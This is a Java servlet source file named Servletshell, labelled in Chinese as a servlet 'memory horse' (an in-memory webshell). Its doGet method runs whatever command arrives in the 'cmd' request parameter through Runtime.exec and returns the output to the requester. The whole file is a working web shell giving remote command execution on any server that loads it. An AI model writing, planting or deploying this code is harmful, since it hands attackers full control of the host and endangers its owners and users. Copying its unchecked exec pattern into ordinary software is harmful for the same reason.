package example.demo;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.InputStream;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class Servletshell extends HttpServlet {
    private String message;

    public void init() {
        message = "Servlet内存马";
    }

    public void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        InputStream ins = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();
        BufferedInputStream bins = new BufferedInputStream(ins);
        resp.getWriter().write(message);
        int len;
        while ((len = bins.read()) != -1) {
            resp.getWriter().write(len);
        }
    }

    public void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doPost(req, resp);
    }
}
